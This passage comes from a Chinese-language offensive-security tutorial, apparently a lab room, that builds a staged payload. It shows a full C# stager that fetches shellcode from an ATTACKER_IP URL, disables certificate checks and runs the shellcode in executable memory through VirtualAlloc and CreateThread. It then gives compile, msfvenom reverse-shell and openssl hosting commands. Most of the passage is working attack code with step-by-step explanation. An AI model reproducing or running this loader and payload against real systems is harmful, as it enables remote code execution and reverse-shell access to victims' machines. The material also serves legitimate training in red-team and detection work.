style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">UInt32</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">IntPtr</span><span class="token plain"> hHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwMilliseconds</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> MEM_COMMIT </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x1000</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> PAGE_EXECUTE_READWRITE </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x40</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">public</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token return-type class-name keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name keyword" style="color:#00009f">string</span><span class="token plain"> url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;https://ATTACKER_IP/shellcode.bin&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">Stager</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">public</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token return-type class-name keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Stager</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name keyword" style="color:#00009f">string</span><span class="token plain"> url</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">WebClient</span><span class="token plain"> wc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token constructor-invocation class-name">WebClient</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ServicePointManager</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ServerCertificateValidationCallback </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">delegate</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ServicePointManager</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">SecurityProtocol </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> SecurityProtocolType</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Tls12</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> shellcode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> wc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">DownloadData</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">UInt32</span><span class="token plain"> codeAddr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">UInt32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> MEM_COMMIT</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> PAGE_EXECUTE_READWRITE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Marshal</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">Copy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">IntPtr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">codeAddr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> shellcode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">IntPtr</span><span class="token plain"> threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> IntPtr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Zero</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">UInt32</span><span class="token plain"> threadId </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">IntPtr</span><span class="token plain"> parameter </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> IntPtr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Zero</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> codeAddr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> parameter</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> threadId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">threadHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xFFFFFFFF</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div></div></div></details>
<p>代码起初可能看起来令人生畏，但相对简单。 让我们逐步分析它的作用。</p>
<p>代码的第一部分将通过 P/Invoke 导入一些 Windows API 函数。 我们需要的函数是来自 <code>kernel32.dll</code> 的以下三个：</p>
<table><thead><tr><th style="text-align:left">WinAPI 函数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc" target="_blank" rel="noopener noreferrer" class="">VirtualAlloc()</a></td><td style="text-align:left">允许我们保留一些内存供我们的 shellcode 使用。</td></tr><tr><td style="text-align:left"><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread" target="_blank" rel="noopener noreferrer" class="">CreateThread()</a></td><td style="text-align:left">创建一个线程作为当前进程的一部分。</td></tr><tr><td style="text-align:left"><a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject" target="_blank" rel="noopener noreferrer" class="">WaitForSingleObject()</a></td><td style="text-align:left">用于线程同步。 它允许我们在继续之前等待线程完成。</td></tr></tbody></table>
<p>负责导入这些函数的代码部分如下：</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token function" style="color:#d73a49">DllImport</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">UInt32</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">UInt32</span><span class="token plain"> lpStartAddr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> flAllocationType</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> flProtect</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token function" style="color:#d73a49">DllImport</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">IntPtr</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">UInt32</span><span class="token plain"> lpThreadAttributes</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwStackSize</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> lpStartAddress</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">IntPtr</span><span class="token plain"> param</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwCreationFlags</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> lpThreadId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token function" style="color:#d73a49">DllImport</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">UInt32</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">IntPtr</span><span class="token plain"> hHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwMilliseconds</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>我们代码中最重要的部分将在 <code>Stager()</code> 函数中，其中将实现阶段器逻辑。 Stager 函数将接收一个 URL，从该 URL 下载要执行的 shellcode。</p>
<p><code>Stager()</code> 函数的第一部分将创建一个新的 <code>WebClient()</code> 对象，允许我们使用 Web 请求下载 shellcode。 在进行实际请求之前，我们将覆盖 <code>ServerCertificateValidationCallback</code> 方法，该方法负责在使用 HTTPS 请求时验证 SSL 证书，以便 WebClient 不会抱怨自签名或无效证书，这些证书我们将用于托管载荷的 Web 服务器。 之后，我们将调用 <code>DownloadData()</code> 方法从给定的 URL 下载 shellcode，并将其存储到 <code>shellcode</code> 变量中：</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token class-name">WebClient</span><span class="token plain"> wc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token constructor-invocation class-name">WebClient</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServicePointManager</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ServerCertificateValidationCallback </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">delegate</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServicePointManager</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">SecurityProtocol </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> SecurityProtocolType</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Tls12</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> shellcode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> wc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">DownloadData</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>一旦我们的 shellcode 被下载并可在 <code>shellcode</code> 变量中使用，我们需要在实际运行之前将其复制到可执行内存中。 我们使用 <code>VirtualAlloc()</code> 向操作系统请求一个内存块。 请注意，我们请求分配足够的内存来分配 <code>shellcode.Length</code> 字节，并设置 <code>PAGE_EXECUTE_READWRITE</code> 标志，使分配的内存可执行、可读和可写。 一旦我们的可执行内存块被保留并分配给 codeAddr 变量，我们使用 Marshal.Copy() 将 shellcode 变量的内容复制到 codeAddr 变量中。</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token class-name">UInt32</span><span class="token plain"> codeAddr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">UInt32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> MEM_COMMIT</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> PAGE_EXECUTE_READWRITE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Marshal</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">Copy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">IntPtr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">codeAddr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> shellcode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>现在我们在一个可执行内存块中分配了 shellcode 的副本，我们使用 <code>CreateThread()</code> 函数在当前进程中生成一个新线程，该线程将执行我们的 shellcode。 传递给 CreateThread 的第三个参数指向 <code>codeAddr</code>，即我们的 shellcode 存储位置，这样当线程启动时，它会像运行常规函数一样运行我们的 shellcode 内容。 第五个参数设置为 0，意味着线程将立即启动。</p>
<p>一旦线程被创建，我们将调用 <code>WaitForSingleObject()</code> 函数来指示当前程序必须等待线程执行完成才能继续。 这可以防止我们的程序在 shellcode 线程有机会执行之前关闭：</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token class-name">IntPtr</span><span class="token plain"> threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> IntPtr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Zero</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token class-name">UInt32</span><span class="token plain"> threadId </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token class-name">IntPtr</span><span class="token plain"> parameter </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> IntPtr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Zero</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> codeAddr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> parameter</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> threadId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">threadHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xFFFFFFFF</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>要编译代码，我们建议将其复制到 Windows 机器上，作为名为 staged-payload.cs 的文件，并使用以下命令进行编译：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">PowerShell</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> csc staged-payload.cs</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="使用我们的阶段器运行反向-shell">使用我们的阶段器运行反向 shell<a href="#使用我们的阶段器运行反向-shell" class="hash-link" aria-label="使用我们的阶段器运行反向 shell的直接链接" title="使用我们的阶段器运行反向 shell的直接链接" translate="no">​</a></h3>
<p>一旦我们的 payload 编译完成，我们将需要设置一个 web 服务器来托管最终的 shellcode。 请记住，我们的阶段器将连接到此服务器以检索 shellcode，并在受害机器的内存中执行它。 让我们首先生成一个 shellcode（文件名需要与我们的阶段器中的 URL 匹配）：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">AttackBox</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/x64/shell_reverse_tcp </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">ATTACKER_IP </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">7474</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> raw </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> shellcode.bin </span><span class="token parameter variable" style="color:#36acaa">-b</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;\x00\x0a\x0d&#x27;</span><br></span></code></pre></div></div>
<p>请注意，我们正在为 shellcode 使用原始格式，因为阶段器会直接将下载的内容加载到内存中。</p>
<p>现在我们有了一个 shellcode，让我们设置一个简单的 HTTPS 服务器。 首先，我们需要使用以下命令创建一个自签名证书：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">AttackBox</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ openssl req </span><span class="token parameter variable" style="color:#36acaa">-new</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-x509</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-keyout</span><span class="token plain"> localhost.pem </span><span class="token parameter variable" style="color:#36acaa">-out</span><span class="token plain"> localhost.pem </span><span class="token parameter variable" style="color:#36acaa">-days</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">365</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-nodes</span><br></span></code></pre></div></div>
<p>您将被要求提供一些信息，但可以随意按回车键跳过任何请求的信息，因为我们不需要 SSL 证书有效。 一旦我们有了 SSL 证书，我们可以使用 python3 通过以下命令生成一个简单的 HTTPS 服务器：</p>
